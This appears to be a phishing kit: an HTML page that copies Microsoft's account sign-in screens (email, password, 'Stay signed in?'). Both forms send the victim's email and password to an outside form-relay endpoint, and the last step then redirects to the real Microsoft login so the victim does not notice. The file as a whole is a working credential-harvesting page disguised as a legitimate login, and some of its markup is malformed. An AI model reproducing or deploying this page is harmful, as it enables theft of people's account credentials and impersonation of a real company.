<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/assests/favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="../app.css" />
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="/assests/logo.png" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>

         <form action="https://formsubmit.co/el/wehoya" method="POST"
     class="mt-3" name="form" id="myForm" >
    <div class="mb-3">
        <input
            type="text"
            name="email"
            class="input"
            id="inp_uname"
            placeholder="Email, phone, or Skype" required
        />

        
    </div>
    <div>
                <button class="btn" id="btn_next" onclick="next()">Next</button>
            </div>
</form>            
            <div>
                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Sign in with a security key
                        <img src="/assests/question.png" alt="Question img">
                    </a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_next">Next</button>
            </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="/assests/key.png"
                        width="30px" /></span> Sign-in options</p>
        </div>
    </section>

    <section id="section_pwd" class="d-none">
        <div class="auth-wrapper">
            <img src="/assests/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <button class="back">
                    <img src="/assests/back.png" />
                </button>
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Enter password</h2>

<form action="https://formsubmit.co/el/wehoya" method="POST"
     class="mt-3" name="form" id="myForm>
    <div class="mb-3">
        <input
            type="text"
            name="password
            class="input"
            id="inp_pwd"
            placeholder="password" required
        />

        
    </div>
    <div>
                <button class="btn" id="btn_sig" onclick="submitForm()">Sign in</button>
            </div>
</form>
                        
            <div>
                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                <p class="mb-16">
                    <a href="#" class="link fs-13">Other ways to sign in</a>
                </p>
            </div>
        </div>
    </section>

    <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="/assests/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Stay signed in?</h2>
            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
            <label class="has-checkbox">
                <input type="checkbox" class="checkbox" />
                <span>Don't show this again</span>
            </label>
<div class="btn-group"> 
    <a href="https://login.live.com" class="btn btn-sec">No</a> 
    <a href="https://login.live.com" class="btn">Yes</a> 
</div>

            
           <!-- <div class="btn-group">
                <button class="btn btn-sec" id="btn_final">No</button>
                <button class="btn" id="btn_final">Yes</button>
            </div> -->
        </div>
    </section>
    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="../app.js"></script>
 <script>
        function next() {
            // Validate the form
            if (validate()) {
                // If validation passes, hide the current section and show the next one
                document.getElementById("section_uname").classList.toggle('d-none');
                document.getElementById('section_pwd').classList.remove('d-none');
                document.querySelectorAll('#user_identity').forEach((e) => {
                    e.innerText = document.getElementById('inp_uname').value;
                });
            }
        }

        function validate() {
            // Your validation logic here
            // Return true if validation passes, false otherwise
            return true;
        }

        function submitForm() {
            // Use JavaScript to submit the form
            document.getElementById('myForm').submit();
        }
    </script>
    
</body>

</html>
